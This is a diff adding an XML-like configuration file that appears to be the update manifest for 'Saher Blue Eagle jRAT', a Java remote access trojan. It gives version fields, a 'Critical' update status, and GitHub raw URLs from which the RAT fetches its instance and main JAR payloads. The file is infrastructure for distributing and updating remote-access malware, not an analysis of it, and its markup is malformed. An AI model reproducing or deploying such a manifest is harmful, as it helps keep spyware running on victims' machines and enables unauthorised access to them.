@@ -1,0 +1,18 @@
+<config>
+<Start>
+<Standard Version = '1.0'></Standard Version>
+<Update Version = '1.0'></Update Version>
+<Update Version = '1.0'></Update Version>
+<String Values =""
+set Values = "_
+jsz=3
+jname=Saher Blue Eagle jRAT jXPR Tool
+jupdate=1.5
+jversion=1.45
+joptions=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Release/SBEjRAT_Instance.jar
+jold_instance=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Old_Instance/SBEjRAT_Instance.jar
+jmain_update=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Release/SBEjRAT.jar
+jupdatestatus=Critical 
+              _"></String>
+<End>
+</config>
